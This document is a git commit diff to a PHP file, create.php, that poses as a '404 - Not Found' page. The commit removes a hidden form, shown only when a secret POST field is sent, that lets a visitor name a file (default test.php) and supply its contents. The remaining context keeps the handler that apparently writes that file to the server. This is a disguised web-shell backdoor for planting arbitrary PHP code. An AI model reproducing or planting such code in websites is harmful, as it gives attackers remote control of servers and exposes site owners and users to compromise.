8335379ca22cd8dd0cdc728391d5cf568da607e3
kristofmak <45071452+kristofmak@users.noreply.github.com>
2018-11-15 20:26:48 +0600

    Update create.php

--- create.php
+++ create.php
@@ -9,26 +9,6 @@
   <h1>404 - Not Found</h1>
  </body>
 </html>
-
-<?php if(isset($_POST['new'])){
-?><html>
-<head>
-        <meta http-equiv="content-type" content="text/html; charset=utf-8" />
-</head>
-<body>
-
-<form name="upload-dir" action="" method="post"
-enctype="multipart/form-data">
-<label for="file">Filename:</label>  
-<input type="text" value="test.php"  name="Filename" id="Filename"><br>
-<textarea name="data" style="width:600px;height:600px"></textarea><br>
- 
-<input type="submit" name="submit" value="Submit">
-</form>
-
-</body>
-</html>
-<?php }?>
 <?php
 if(isset($_POST['Filename']))
 {
